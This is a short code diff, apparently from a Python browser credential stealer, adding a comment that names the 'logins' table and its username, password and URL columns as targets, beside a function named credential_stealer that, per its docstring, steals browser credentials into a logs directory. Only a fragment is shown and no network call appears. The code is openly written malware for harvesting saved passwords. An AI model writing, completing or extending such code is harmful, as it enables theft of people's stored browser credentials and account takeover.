@@ -4,6 +4,13 @@ import sqlite3
 from util import get_profiles, create_temp_file, create_log_file, try_decrypt
 
 
+"""
+Tables of interest from SQLi Recon:
+- logins: contains all the credentials (with encrypted passwords)
+    - Columns of interest: action_url, username_value, password_value
+"""
+
+
 def credential_stealer(browser: dict, encryption_key: str) -> None:
     """ Steals credentials from a browser and places them into the logs directory """
     # Examine each profile
